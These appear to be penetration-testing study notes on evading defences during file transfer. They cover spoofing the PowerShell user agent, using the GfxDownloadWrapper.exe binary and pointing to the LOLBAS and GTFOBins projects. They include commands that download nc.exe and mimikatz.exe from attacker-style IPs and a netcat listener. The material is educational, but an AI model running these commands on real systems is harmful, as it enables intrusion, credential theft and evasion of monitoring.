# Changing User Agent
---
- If diligent administrators or defenders have **blacklisted any of these User Agents,** **==Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent==** to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari.

- Listing out User Agents:
	- `[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`
	- ![[Pasted image 20250623065703.png]]
- Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
	- `$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`
	- `Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`
	- `nc -lvnp 80`

# LOLBAS / GTFOBins
---
- Application whitelisting **may prevent you from using PowerShell or Netcat**, and command-line logging may alert defenders to your presence.
- An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), in**stalled on some systems and contains functionality to download configuration files periodically.** This download functionality can be invoked as follows:

- `GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`

- Such a binary **might be permitted to run by application whitelisting and be excluded from alerting.**
- Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. 
- Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.